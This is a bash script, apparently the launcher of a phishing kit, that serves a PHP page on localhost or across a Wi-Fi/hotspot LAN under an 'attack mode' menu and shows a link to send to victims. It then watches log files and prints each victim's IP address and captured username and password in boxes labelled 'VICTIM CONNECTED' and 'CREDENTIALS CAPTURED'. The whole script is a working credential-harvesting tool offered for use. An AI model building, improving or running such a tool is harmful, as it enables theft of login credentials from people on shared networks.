#!/bin/bash

# --- 🛠️ FIX PHP PERMISSION ERROR (सबसे ज़रूरी लाइन) ---
# Hum PHP ke liye ek local folder banayenge taki permission ka error na aaye
mkdir -p .php_tmp
chmod 777 .php_tmp
export TMPDIR=$(pwd)/.php_tmp

# --- 🎨 COLORS ---
GOLD='\033[1;33m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
GREY='\033[1;30m'
RED='\033[1;31m'
GREEN='\033[1;32m'
RESET='\033[0m'

# --- 🛡️ ICONS ---
ICON_LOCK="🔒"
ICON_WIFI="📡"
ICON_USER="💀"
ICON_KEY="🔑"
ICON_GEAR="⚙️"
ICON_CHECK="✅"
ICON_ANDROID="📱"

# --- DETECT SYSTEM ---
if [[ -d "/data/data/com.termux/files/home" ]]; then
    IS_TERMUX=true
else
    IS_TERMUX=false
fi

# --- AUTO KILL OLD PROCESS ---
pkill -f php > /dev/null 2>&1

# --- CLEANUP TRAP ---
trap "echo -e '\n${RED}[!] Exiting Tool...${RESET}'; pkill -f php; exit" SIGINT SIGTERM

# --- SETUP FILES ---
rm -rf usernames.txt ip.txt
touch usernames.txt ip.txt

# --- BANNER ---
clear
echo -e "${GOLD}"
echo "╔══════════════════════════════════════════════════════╗"
echo "║                                                      ║"
echo "║    _    _   _ _   _ ____      _    ____              ║"
echo "║   / \  | \ | | | | |  _ \    / \  / ___|             ║"
echo "║  / _ \ |  \| | | | | |_) |  / _ \| |  _              ║"
echo "║ / ___ \| |\  | |_| |  _ <  / ___ \ |_| |             ║"
echo "║/_/   \_\_| \_|\___/|_| \_\/_/   \_\____|             ║"
echo "║                                                      ║"
if [ "$IS_TERMUX" = true ]; then
    echo "║      ${GREEN}SYSTEM DETECTED: ${ICON_ANDROID} ANDROID (TERMUX)${GOLD}           ║"
else
    echo "║      ${CYAN}SYSTEM DETECTED: 💻 PC / LINUX / MAC${GOLD}            ║"
fi
echo "║         ${WHITE}CREATED BY : ${CYAN}ANURAG HKR${GOLD}                      ║"
echo "╚══════════════════════════════════════════════════════╝"
echo -e "${RESET}"

# --- MENU ---
echo -e " ${GOLD}╔══ [ SELECT ATTACK MODE ] ══════════════════════════╗${RESET}"
echo -e " ${GOLD}║${RESET}  [${CYAN}01${RESET}] ${WHITE}Localhost     ${GREY}(Self Test)${RESET}                   ${GOLD}║${RESET}"
echo -e " ${GOLD}║${RESET}  [${CYAN}02${RESET}] ${WHITE}LAN Network   ${GREEN}(WiFi/Hotspot Attack)${RESET}          ${GOLD}║${RESET}"
echo -e " ${GOLD}╚════════════════════════════════════════════════════╝${RESET}"
echo ""
echo -ne " ${ICON_GEAR} ${GOLD}Select Option : ${RESET}"
read -n 1 option
echo ""
echo ""

if [[ $option == "1" ]]; then
    HOST="127.0.0.1"
    PORT="8080"
elif [[ $option == "2" ]]; then
    HOST="0.0.0.0"
    PORT="8080"
else
    echo -e "${RED} [!] Invalid Selection! ${RESET}"
    exit 1
fi

# --- STARTING SERVER (Fixed) ---
echo -e " ${ICON_WIFI}  ${CYAN}Starting PHP Server...${RESET}"

# PHP command me -t . ka matlab hai current folder ko root maano
php -S $HOST:$PORT -t . > php_error.log 2>&1 &
PID_PHP=$!
sleep 3

# Check if Server is Alive
if ! ps -p $PID_PHP > /dev/null; then
    echo -e " ${RED}[!] Server Failed to Start! Error Log:${RESET}"
    echo -e "${GOLD}------------------------------------------------${RESET}"
    cat php_error.log
    echo -e "${GOLD}------------------------------------------------${RESET}"
    exit 1
fi

echo -e " ${ICON_CHECK}  ${GREEN}Status: ${WHITE}ONLINE${RESET}"

# IP DISPLAY
if [[ $option == "2" ]]; then
    if [ "$IS_TERMUX" = true ]; then
        MYIP=$(ifconfig 2>/dev/null | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | grep -v "127.0.0.1" | head -n 1)
    else
        MYIP=$(ipconfig 2>/dev/null | grep "IPv4" | head -n 1 | cut -d: -f2 | tr -d ' ') 
        if [ -z "$MYIP" ]; then
            MYIP=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -n 1)
        fi
    fi
    
    if [ -z "$MYIP" ]; then
        echo -e " ${ICON_LOCK}  ${RED}Link: ${WHITE}http://$HOST:$PORT ${RESET}"
    else
        echo -e " ${ICON_LOCK}  ${RED}Link: ${WHITE}http://$MYIP:$PORT ${RESET}"
    fi
else
    echo -e " ${ICON_LOCK}  ${RED}Link: ${WHITE}http://127.0.0.1:$PORT ${RESET}"
fi

echo -e " ${GREY} Waiting for targets... (Press Ctrl+C to stop)${RESET}"
echo ""

# --- LIVE MONITORING ---
tail -f usernames.txt ip.txt --pid=$PID_PHP 2>/dev/null | while read line; do
    if [[ "$line" == "IP:"* ]]; then
        IP=${line#IP: }
        echo -e "\n ${GOLD}╔══ [ ${ICON_WIFI} VICTIM CONNECTED ] ══════════════════════════╗${RESET}"
        echo -e " ${GOLD}║${RESET}  IP Address : ${CYAN}$IP${RESET}"
        echo -e " ${GOLD}╚════════════════════════════════════════════════════╝${RESET}"
        echo -e "\a"
    elif [[ "$line" == *"Login info Found"* ]]; then
        echo -e " ${RED}╔══ [ ${ICON_USER} CREDENTIALS CAPTURED ] ══════════════════════╗${RESET}"
    elif [[ "$line" == *"Account"* ]]; then
        USER=${line#* : }
        echo -e " ${RED}║${RESET}  ${ICON_USER} Username : ${WHITE}$USER${RESET}"
    elif [[ "$line" == *"Password"* ]]; then
        PASS=${line#* : }
        echo -e " ${RED}║${RESET}  ${ICON_KEY} Password : ${WHITE}$PASS${RESET}"
    elif [[ "$line" == *"Date"* ]]; then
        DATE=${line#* : }
        echo -e " ${RED}║${RESET}  ⏰ Time     : ${GREY}$DATE${RESET}"
        echo -e " ${RED}╚════════════════════════════════════════════════════╝${RESET}"
        echo -e "\a"
    fi
done
